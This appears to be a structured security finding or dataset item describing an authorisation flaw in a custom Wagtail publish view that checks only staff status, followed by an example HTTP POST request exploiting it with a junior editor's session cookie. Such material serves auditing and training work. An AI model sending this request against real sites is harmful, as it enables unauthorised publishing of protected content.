diagnosis: The view checks only request.user.is_staff before publishing a page revision. It omits Wagtail's object-level permission check page.permissions_for_user(request.user).can_publish(), allowing any staff member to publish edits to protected tree sections outside their editorial jurisdiction.
exploit_request:
POST /cms-custom/pages/102/publish/ HTTP/1.1
Host: wagtail.example.com
Cookie: sessionid=junior_editor_session
